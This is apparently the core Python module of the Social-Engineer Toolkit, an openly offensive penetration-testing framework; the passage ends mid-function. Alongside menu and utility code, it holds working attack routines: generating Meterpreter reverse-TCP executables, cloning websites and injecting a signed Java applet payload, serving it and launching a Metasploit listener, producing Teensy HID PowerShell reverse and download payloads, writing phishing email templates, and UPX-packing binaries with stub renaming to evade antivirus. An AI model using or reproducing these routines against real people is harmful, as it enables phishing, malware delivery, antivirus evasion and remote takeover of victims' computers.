#!/usr/bin/env python
##############################################
#    Centralized core modules for SET        #
##############################################
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
import inspect
import base64
from src.core import dictionaries
import thread
import cStringIO
import trace

# check to see if we have python-pycrypto
try:
    from Crypto.Cipher import AES

except ImportError:

    print "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications."
    pass

# get the main SET path
def definepath():
    if check_os() == "posix":
        if os.path.isfile("setoolkit"):
            return os.getcwd()
        else:
            return "/usr/share/setoolkit/"

    else:
        return os.getcwd()            

# check operating system
def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

#
# Class for colors
#
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# if we are windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# this will be the home for the set menus
def setprompt(category, text):
    # if no special prompt and no text, return plain prompt
    if category == '0' and text == "":
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
    # if the loop is here, either category or text was positive
    # if it's the category that is blank...return prompt with only the text
    if category == '0':
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
    # category is NOT blank
    else:
        # initialize the base 'set' prompt
        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
        # if there is a category but no text
        if text == "":
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring += ">"
            return promptstring
        # if there is both a category AND text
        else:
            # iterate through the list received
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring = promptstring + "> " + text + ":"
            return promptstring

def yesno_prompt(category,text):
    valid_response = False
    while not valid_response:
        response = raw_input(setprompt(category,text))
        response = str.lower(response)
        if response == "no" or response == "n":
            response = "NO"
            valid_response = True
        elif response == "yes" or response == "y":
            response = "YES"
            valid_response = True
        else:
            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
    return response

def return_continue():
    print ("\n      Press " + bcolors.RED + "<return> " + bcolors.ENDC + "to continue")
    pause = raw_input()

############ DEBUGGING ###############
#### ALWAYS SET TO ZERO BEFORE COMMIT!
DEBUG_LEVEL = 0
                  #  0 = Debugging OFF
                  #  1 = debug imports only
                  #  2 = debug imports with pause for <ENTER>
                  #  3 = imports, info messages
                  #  4 = imports, info messages with pause for <ENTER>
                  #  5 = imports, info messages, menus
                  #  6 = imports, info messages, menus with pause for <ENTER>

debugFrameString = '-' * 72

def debug_msg(currentModule, message, msgType):
    if DEBUG_LEVEL == 0:
        pass         #stop evaluation efficiently
    else:
        if msgType <= DEBUG_LEVEL:
            # a bit more streamlined
            print bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC

            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                raw_input("waiting for <ENTER>\n")

def mod_name():
    frame_records = inspect.stack()[1]
    calling_module=inspect.getmodulename(frame_records[1])
    return calling_module

##########################################
############ RUNTIME MESSAGES ############
def print_status(message):
    print bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message)

def print_info(message):
    print bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message)

def print_info_spaces(message):
    print bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message)

def print_warning(message):
    print bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message)

def print_error(message):
    print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC

def get_version():
    define_version = '6.0.3'
    return define_version

class create_menu:
    def __init__(self, text, menu):
        self.text = text
        self.menu = menu
        print text
        for i, option in enumerate(menu):

            menunum = i + 1
            # Check to see if this line has the 'return to main menu' code
            match = re.search("0D", option)
            # If it's not the return to menu line:
            if not match:
                if menunum < 10:
                    print('   %s) %s' % (menunum,option))
                else:
                    print('  %s) %s' % (menunum,option))
            else:
                print '\n  99) Return to Main Menu\n'
        return

def validate_ip(address):
    try:
        if socket.inet_aton(address):
            if len(address.split('.')) == 4:
                debug_msg("setcore","this is a valid IP address",5)
                return True
            else:
                print_error("This is not a valid IP address...")
                raise socket.error
        else:
            raise socket_error

    except socket.error:
        return False

#
# grab the metaspoit path
#
def meta_path():
    # DEFINE METASPLOIT PATH
    msf_path = check_config("METASPLOIT_PATH=")
    if msf_path.endswith("/"): pass
    else: msf_path = msf_path + "/"
    trigger = 0
    if not os.path.isdir(msf_path):

                # specific for kali linux
                if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
                    msf_path = "/opt/metasploit/apps/pro/msf3/"
                    trigger = 1

                # specific for backtrack5 and other backtrack versions
                if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                    msf_path = "/opt/framework3/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/framework/msf3/msfconsole"):
                    msf_path = "/opt/framework/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
                    msf_path = "/opt/metasploit/msf3/"
                    trigger = 1
                if os.path.isfile("/usr/bin/msfconsole"):
                    msf_path = ""
                    trigger = 1

                # specific for pwnpad and pwnplug (pwnie express)
                if os.path.isfile("/opt/metasploit-framework/msfconsole"):
                    msf_path = "/opt/metasploit-framework"
                    trigger = 1

                if trigger == 0:
                    if check_os() != "windows":
                        check_metasploit = check_config("METASPLOIT_MODE=").lower()
                        if check_metasploit != "off":
                            print_error("Metasploit path not found. These payloads will be disabled.")
                            print_error("Please configure in the config/set_config.")
                            return_continue()
                            return False

                    # if we are using windows
                    if check_os() == "windows":
                        print_warning("Metasploit payloads are not currently supported. This is coming soon.")
                        msf_path = ""

    # this is an option if we don't want to use Metasploit period
    check_metasploit = check_config("METASPLOIT_MODE=").lower()
    if check_metasploit != "on": msf_path = False
    return msf_path

#
# grab the metaspoit path
#
def meta_database():
    # DEFINE METASPLOIT PATH
    meta_path = file("%s/config/set_config" % (definepath()),"r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_DATABASE=", line)
        if match:
            line = line.replace("METASPLOIT_DATABASE=","")
            msf_database = line.rstrip()
            return msf_database


#
# grab the interface ip address
#
def grab_ipaddress():
    try:
        fileopen = file("%s/config/set_config" % (definepath()), "r").readlines()
        for line in fileopen:
            line = line.rstrip()
            match = re.search("AUTO_DETECT=ON", line)
            if match:
                try:
                    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    rhost.connect(('google.com', 0))
                    rhost.settimeout(2)
                    rhost = rhost.getsockname()[0]
                    return rhost
                except Exception:
                    rhost = raw_input(setprompt("0", "Enter your interface IP Address"))
                    while 1:
                        # check if IP address is valid
                        ip_check = is_valid_ip(rhost)
                        if ip_check == False:
                            rhost = raw_input("[!] Invalid ip address try again: ")
                        if ip_check == True: break
                    return rhost
    
        # if AUTO_DETECT=OFF prompt for IP Address
            match1 = re.search("AUTO_DETECT=OFF", line)
            if match1:
                rhost = raw_input(setprompt("0", "IP address for the payload listener"))
                while 1:
                        # check if IP address is valid
                    ip_check = is_valid_ip(rhost)
                    if ip_check == False:
                        rhost = raw_input("[!] Invalid ip address try again: ")
                    if ip_check == True: break
                return rhost

    except Exception, e:
        print_error("ERROR:Something went wrong:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


#
# cleanup old or stale files
#
def cleanup_routine():
    try:
        # restore original Java Applet
        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath()), setdir + "/Signed_Update.jar")
        if os.path.isfile("newcert.pem"):
            os.remove("newcert.pem")
        if os.path.isfile(setdir + "/interfaces"):
            os.remove(setdir + "/interfaces")
        if os.path.isfile("src/html/1msf.raw"):
            os.remove("src/html/1msf.raw")
        if os.path.isfile("src/html/2msf.raw"):
            os.remove("src/html/2msf.raw")
        if os.path.isfile("msf.exe"):
            os.remove("msf.exe")
        if os.path.isfile("src/html/index.html"):
            os.remove("src/html/index.html")
        if os.path.isfile(setdir + "/Signed_Update.jar"):
            os.remove(setdir + "/Signed_Update.jar")

    except:
        pass

# quick check to see if we are running kali-linux
def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = file("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        # if we aren't running kali
        else: return "Non-Kali"
    else:
        print "[!] Not running a Debian variant.."
        return "Non-Kali"

# checking if we have bleeding-edge enabled for updates
def bleeding_edge():
    # first check if we are actually using Kali
    kali = check_kali()
    if kali == "Kali":
        print_status("Checking to see if bleeding-edge repos are active.")
        # check if we have the repos enabled first
        fileopen = file("/etc/apt/sources.list", "r")
        kalidata = fileopen.read()
        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
            print_status("Bleeding edge already active..Moving on..")
            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
            return True

        # else lets add them if they want
        else:
            print_status("Adding Kali bleeding edge to sources.list for updates.")
            # we need to add repo to kali file
            # we will rewrite the entire apt in case not all repos are there
            filewrite = file("/etc/apt/sources.list", "w")
            filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
            filewrite.close()
            print_status("Updating Kali now...")
            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
            return True

    else:
        print "[!] Kali was not detected. Not adding bleeding edge repos."
        return False

#
# Update The Social-Engineer Toolkit
#
def update_set():
    kali = check_kali()
    if kali == "Kali":
        print_status("You are running Kali Linux which maintains SET updates.")
        print_status("You can enable bleeding-edge repos for up-to-date SET.")
        time.sleep(2)
        bleeding_edge()

    # if we aren't running Kali :( 
    else:
        peinr_info("Kali-Linux not detected, manually updating..")
        print_info("Updating the Social-Engineer Toolkit, be patient...")
        print_info("Performing cleanup first...")
        subprocess.Popen("git clean -fd", shell=True).wait()
        print_info("Updating... This could take a little bit...")
        subprocess.Popen("git pull", shell=True).wait()
        print_status("The updating has finished, returning to main menu..")
        time.sleep(2)

#
# Pull the help menu here
#
def help_menu():
    fileopen = file("README.md", "r").readlines()
    for line in fileopen:
        line = line.rstrip()
        print line
    fileopen = file("readme/CREDITS", "r").readlines()
    print "\n"
    for line in fileopen:
        line = line.rstrip()
        print line
    return_continue()


#
# This is a small area to generate the date and time
#
def date_time():
    now = str(datetime.datetime.today())
    return now

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#
def site_cloner(website, exportpath, *args):
    grab_ipaddress()
    ipaddr = grab_ipaddress()
    filewrite = file(setdir + "/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/site.template", "w")
    filewrite.write("URL=" + website)
    filewrite.close()
    # if we specify a second argument this means we want to use java applet
    if args[0] == "java":
        # needed to define attack vector
        filewrite = file(setdir + "/attack_vector", "w")
        filewrite.write("java")
        filewrite.close()
    sys.path.append("src/webattack/web_clone")
    # if we are using menu mode we reload just in case
    try:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        reload(cloner)

    except:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        import cloner

    # copy the file to a new folder
    print_status("Site has been successfully cloned and is: " + exportpath)
    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

#
# this will generate a meterpreter reverse payload (executable)
# with backdoored executable, digital signature stealing, and
# UPX encoded (if these options are enabled). It will automatically
# inherit the AUTO_DETECT=ON or OFF configuration.
#
# usage: metasploit_reverse_tcp_exe(portnumber)
#
def meterpreter_reverse_tcp_exe(port):

    ipaddr = grab_ipaddress()
    filewrite = file(setdir + "/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    update_options("IPADDR=" + ipaddr)

    # trigger a flag to be checked in payloadgen
    # if this flag is true, it will skip the questions
    filewrite = file(setdir + "/meterpreter_reverse_tcp_exe", "w")
    filewrite.write(port)
    filewrite.close()
    # import the system path for payloadgen in SET
    sys.path.append("src/core/payloadgen")
    try:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        reload(create_payloads)

    except:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        import create_payloads

    random_value = generate_random_string(5, 10)
    # copy the created executable to program_junk
    print_status("Executable created under %s/%s.exe" % (setdir,random_value))
    subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir,setdir,random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
#
# Start a metasploit multi handler
#
def metasploit_listener_start(payload,port):
    # open a file for writing
    filewrite = file(setdir + "/msf_answerfile", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
    # close the file
    filewrite.close()
    # launch msfconsole
    metasploit_path = meta_path()
    subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" % (metasploit_path, setdir), shell=True).wait()

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        thread.start_new_thread(httpd.serve_forever, ())

    # handle keyboard interrupts
    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()

#
# this will start a web server without threads
#
def start_web_server_unthreaded(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread, SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        httpd.serve_forever()
        # change directory to the path we specify for output path
        os.chdir(directory)
        # handle keyboard interrupts

    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website, port, directory):
    # create the payload
    meterpreter_reverse_tcp_exe(port)
    # clone the website and inject java applet
    site_cloner(website,directory,"java")

    # this part is needed to rename the msf.exe file to a randomly generated one
    filename = check_options("MSF.EXE=")
    if check_options != 0:

        # move the file to the specified directory and filename
        subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir,directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # lastly we need to copy over the signed applet
    subprocess.Popen("cp %s/Signed_Update.jar %s" % (setdir,directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # start the web server by running it in the background
    start_web_server(directory)

    # run multi handler for metasploit
    print_info("Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp",port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#
def teensy_pde_generator(attack_method):

    # grab the ipaddress
    ipaddr=grab_ipaddress()

    # if we are doing the attack vector teensy beef
    if attack_method == "beef":
        # specify the filename
        filename = file("src/teensy/beef.pde", "r")
        filewrite = file(setdir + "/reports/beef.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))

    # if we are doing the attack vector teensy beef
    if attack_method == "powershell_down":
        # specify the filename
        filename = file("src/teensy/powershell_down.pde", "r")
        filewrite = file(setdir + "/reports/powershell_down.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))

    # if we are doing the attack vector teensy
    if attack_method == "powershell_reverse":
        # specify the filename
        filename = file("src/teensy/powershell_reverse.pde", "r")
        filewrite = file(setdir + "/reports/powershell_reverse.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))

    # if we are doing the attack vector teensy beef
    if attack_method == "java_applet":
        # specify the filename
        filename = file("src/teensy/java_applet.pde", "r")
        filewrite = file(setdir + "/reports/java_applet.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))

    # if we are doing the attack vector teensy
    if attack_method == "wscript":
        # specify the filename
        filename = file("src/teensy/wscript.pde", "r")
        filewrite = file(setdir + "/reports/wscript.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))

    # All the options share this code except binary2teensy
    if attack_method != "binary2teensy":
        for line in filename:
            line = line.rstrip()
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            filewrite.write(line)

    # binary2teensy method
    if attack_method == "binary2teensy":
        # specify the filename
        import src.teensy.binary2teensy
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir)) 

    print_status(teensy_string)
#
# Expand the filesystem windows directory
#

def windows_root():
    return os.environ['WINDIR']

#
# core log file routine for SET
#
def log(error):
        # open log file only if directory is present (may be out of directory for some reason)
    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "w")
        filewrite.write("")
        filewrite.close()
    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
        error = str(error)
        # open file for writing
        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "a")
        # write error message out
        filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
        # close the file
        filewrite.close()

#
# upx encoding and modify binary
#
def upx(path_to_file):
    # open the set_config
    fileopen = file("config/set_config", "r")
    for line in fileopen:
        line = line.rstrip()
        match = re.search("UPX_PATH=", line)
        if match:
            upx_path = line.replace("UPX_PATH=", "")

    # if it isn't there then bomb out
    if not os.path.isfile(upx_path):
        print_warning("UPX was not detected. Try configuring the set_config again.")

    # if we detect it
    if os.path.isfile(upx_path):
        print_info("Packing the executable and obfuscating PE file randomly, one moment.")
        # packing executable
        subprocess.Popen("%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        # move it over the old file
        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        # random string
        random_string = generate_random_string(3,3).upper()

        # 4 upx replace - we replace 4 upx open the file
        fileopen = file(path_to_file, "rb")
        filewrite = file(setdir + "/temp.binary", "wb")

        # read the file open for data
        data = fileopen.read()
        # replace UPX stub makes better evasion for A/V
        filewrite.write(data.replace("UPX", random_string, 4))
        filewrite.close()
        # copy the file over
        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    time.sleep(3)

def show_banner(define_version,graphic):

    if graphic == "1":
        if check_os() == "posix":
            os.system("clear")
        if check_os() == "windows":
            os.system("cls")
        show_graphic()
    else:
        os.system("clear")

    print bcolors.BLUE + """
[---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
[---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
[---]                Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
[---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
[---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
[---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]

""" + bcolors.GREEN+"""        Welcome to the Social-Engineer Toolkit (SET). 
         The one stop shop for all of your SE needs.
"""
    print bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
    print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC

def show_graphic():
    menu = random.randrange(2,12)
    if menu == 2:
        print bcolors.YELLOW + r"""
                 .--.  .--. .-----.
                : .--': .--'`-. .-'
                `. `. : `;    : :
                 _`, :: :__   : :
                `.__.'`.__.'  :_;   """ + bcolors.ENDC
        return

    if menu == 3:
        print bcolors.GREEN + r"""
          _______________________________
         /   _____/\_   _____/\__    ___/
         \_____  \  |    __)_   |    |
         /        \ |        \  |    |
        /_______  //_______  /  |____|
                \/         \/            """ + bcolors.ENDC
        return

    if menu == 4:
        print bcolors.BLUE + r"""
            :::===  :::===== :::====
            :::     :::      :::====
             =====  ======     ===
                === ===        ===
            ======  ========   ===
""" + bcolors.ENDC

    if menu == 5:
        print bcolors.RED + r"""
           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  """ + bcolors.ENDC
        return

    if menu == 6:
        print bcolors.PURPLE + r'''
         .M"""bgd `7MM"""YMM MMP""MM""YMM
        ,MI    "Y   MM    `7 P'   MM   `7
        `MMb.       MM   d        MM
          `YMMNq.   MMmmMM        MM
        .     `MM   MM   Y  ,     MM
        Mb     dM   MM     ,M     MM
        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
        return

    if menu == 7:
        print bcolors.YELLOW + r"""
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     """ + bcolors.ENDC
        return

    if menu == 8:
        print bcolors.RED + r'''
          !\_________________________/!\
          !!                         !! \
          !! Social-Engineer Toolkit !!  \
          !!                         !!  !
          !!          Free           !!  !
          !!                         !!  !
          !!          #hugs          !!  !
          !!                         !!  !
          !!      By: TrustedSec     !!  /
          !!_________________________!! /
          !/_________________________\!/
             __\_________________/__/!_
            !_______________________!/
          ________________________
         /oooo  oooo  oooo  oooo /!
        /ooooooooooooooooooooooo/ /
       /ooooooooooooooooooooooo/ /
      /C=_____________________/_/''' + bcolors.ENDC

    
    if menu == 9:
        print bcolors.YELLOW + """
     01011001011011110111010100100000011100
     10011001010110000101101100011011000111
     10010010000001101000011000010111011001
     10010100100000011101000110111100100000
     01101101011101010110001101101000001000
     00011101000110100101101101011001010010
     00000110111101101110001000000111100101
     10111101110101011100100010000001101000
     01100001011011100110010001110011001000
     00001110100010110100101001001000000101
     01000110100001100001011011100110101101
     11001100100000011001100110111101110010
     00100000011101010111001101101001011011
     10011001110010000001110100011010000110
     01010010000001010011011011110110001101
     10100101100001011011000010110101000101
     01101110011001110110100101101110011001
     01011001010111001000100000010101000110
     11110110111101101100011010110110100101
     11010000100000001010100110100001110101
     011001110111001100101010""" + bcolors.ENDC


    if menu == 10:
        print bcolors.GREEN + """
                          .  ..                             
                       MMMMMNMNMMMM=                        
                   .DMM.           .MM$                     
                 .MM.                 MM,.                  
                 MN.                    MM.                 
               .M.                       MM                 
              .M   .....................  NM                
              MM   .8888888888888888888.   M7               
             .M    88888888888888888888.   ,M               
             MM       ..888.MMMMM    .     .M.              
             MM         888.MMMMMMMMMMM     M               
             MM         888.MMMMMMMMMMM.    M               
             MM         888.      NMMMM.   .M               
              M.        888.MMMMMMMMMMM.   ZM               
              NM.       888.MMMMMMMMMMM    M:               
              .M+      .....              MM.               
               .MM.                     .MD                 
                 MM .                  .MM                  
                  $MM                .MM.                   
                    ,MM?          .MMM                      
                       ,MMMMMMMMMMM 
                     
                https://www.trustedsec.com""" + bcolors.ENDC

    if menu == 11:
        print bcolors.backBlue + r"""
                          _                                           J
                         /-\                                          J
                    _____|#|_____                                     J
                   |_____________|                                    J
                  |_______________|                                   E
                 ||_POLICE_##_BOX_||                                  R
                 | |-|-|-|||-|-|-| |                                  O
                 | |-|-|-|||-|-|-| |                                  N
                 | |_|_|_|||_|_|_| |                                  I
                 | ||~~~| | |---|| |                                  M
                 | ||~~~|!|!| O || |                                  O
                 | ||~~~| |.|___|| |                                  O
                 | ||---| | |---|| |                                  O
                 | ||   | | |   || |                                  O
                 | ||___| | |___|| |                                  !
                 | ||---| | |---|| |                                  !
                 | ||   | | |   || |                                  !
                 | ||___| | |___|| |                                  !
                 |-----------------|                                  !
                 |   Timey Wimey   |                                  !
                 -------------------                                  !""" + bcolors.ENDC


#
# identify if set interactive shells are disabled
#
def set_check():
    fileopen=file("config/set_config", "r")
    for line in fileopen:
        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
        # if we turned it off then we return a true else return false
        if match:
            return True
        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
        # return false otherwise
        if match1:
            return False

# if the user specifies 99
def menu_back():
    print_info("Returning to the previous menu...")

# used to generate random templates for the phishing schema
def custom_template():
    try:
        print ("         [****]  Custom Template Generator [****]\n")
        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
        author=raw_input(setprompt("0", "Enter the name of the author"))
        filename=randomgen=random.randrange(1,99999999999999999999)
        filename=str(filename)+(".template")
        subject=raw_input(setprompt("0", "Enter the subject of the email"))
        try:
            body=raw_input(setprompt("0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
            while body != 'sdfsdfihdsfsodhdsofh':
                try:
                    body+=(r"\n")
                    body+=raw_input("Next line of the body: ")
                except KeyboardInterrupt: break
        except KeyboardInterrupt: pass
        filewrite=file("src/templates/%s" % (filename), "w")
        filewrite.write("# Author: "+author+"\n#\n#\n#\n")
        filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
        filewrite.write('BODY='+'"'+body+'"\n')
        print "\n"
        filewrite.close()
    except Exception, e:
        print_error("ERROR:An error occured:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# routine for checking length of a payload: variable equals max choice
def check_length(choice,max):
    # start initital loop
    counter = 0
    while 1:
        if counter == 1:
            choice = raw_input(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + "Invalid choice try again: ")
        # try block in case its not a integer
        try:
            # check to see if its an integer
            choice = int(choice)
            # okay its an integer lets do the compare
            if choice > max:
                # trigger an exception as not an int
                choice = "blah"
                choice = int(choice)
            # if everythings good return the right choice
            return choice
        # oops, not a integer
        except Exception:
            counter = 1

# valid if IP address is legit
def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)

# ipv4
def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
